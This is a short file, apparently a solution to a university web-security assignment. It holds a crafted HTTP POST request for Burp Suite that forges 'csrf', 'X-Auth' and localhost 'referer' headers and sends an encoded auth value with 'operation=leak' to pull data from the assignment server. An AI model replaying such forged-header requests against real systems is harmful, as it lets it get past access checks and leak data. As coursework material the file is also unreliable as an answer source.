@@ -1,0 +1,19 @@
+// Please apply this code in the Burp Suite
+// Don't paste all the code but configure the body and request header parameter
+//"csrf", "X-Auth", "referer"
+
+POST /retrieve.php HTTP/1.1
+Host: assignment-artemis.unimelb.life
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=m9fr0qbgfp4f68d3k49o4k3rc8
+Content-Length: 84
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+csrf: testing123321
+X-Auth: custom-auth
+referer: http://localhost/pull.php
+
+auth=Z4!X%3Bgs%7B%5CQ6u%7BfqRnFABc%7BW%26%40%2B%5D9(Ece%7E%2F%2F9-Uvp&operation=leak
